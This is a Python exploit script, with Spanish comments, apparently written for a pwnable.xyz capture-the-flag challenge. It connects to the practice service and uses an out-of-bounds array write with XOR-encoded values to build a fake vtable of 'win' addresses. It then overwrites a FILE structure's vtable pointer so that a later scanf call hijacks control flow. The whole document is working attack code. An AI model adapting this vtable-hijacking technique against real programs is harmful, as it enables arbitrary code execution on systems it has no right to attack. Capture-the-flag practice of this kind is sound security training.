#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

print("Esperando...")
time.sleep(10)

print("Conectando...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

print("\n=== Ataque de vtable ===")
print(f"win = {hex(win)}")
print(f"result_base = {hex(result_base)}")

# Paso 1: Crear fake vtable en result[]
# La vtable tiene muchas funciones, pero típicamente
# __overflow o __xsputn se llaman
print("\nPaso 1: Construyendo fake vtable en result[1-9]...")

# Llenar TODO con win
for i in range(1, 10):
    b = i * 111
    a = win ^ b
    s.sendall(f"{a} {b} {i}\n".encode())
    time.sleep(0.05)

time.sleep(0.3)
# Limpiar buffer
try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

# Paso 2: Sobrescribir vtable pointer
fake_vtable_addr = result_base  # Apuntar al inicio de result[] (result[0])
# O mejor, apuntar a result[1] para tener offset
fake_vtable_addr = result_base + 8

print(f"\nPaso 2: Sobrescribiendo vtable con {hex(fake_vtable_addr)}...")

b = 0x1234567890abcdef
a = fake_vtable_addr ^ b
print(f"Enviando: {a} ^ {b} = {a^b} -> result[-5]")
s.sendall(f"{a} {b} -5\n".encode())

time.sleep(0.5)

# Limpiar
try:
    resp = s.recv(2048, socket.MSG_DONTWAIT)
    print(f"Resp: {resp.decode().strip()[:50]}")
except:
    pass

# Paso 3: Ahora al enviar el siguiente input, scanf usará la fake vtable
print("\nPaso 3: Triggerando scanf que usará fake vtable...")
print("Enviando input normal...")

# Capturar TODO
s.setblocking(False)

try:
    s.sendall(b"1 2 3\n")
except:
    print("Error al enviar (esperado si crasheó)")

# Leer durante varios segundos
print("\nRecolectando output durante 10 segundos...")
all_data = b""
for _ in range(100):  # 10 segundos
    time.sleep(0.1)
    try:
        chunk = s.recv(8192)
        if chunk:
            all_data += chunk
            sys.stdout.write(chunk.decode())
            sys.stdout.flush()
    except:
        pass

print(f"\n\n{'='*60}")
print(f"Total: {len(all_data)} bytes")
if all_data:
    print(all_data.decode())
print('='*60)

s.close()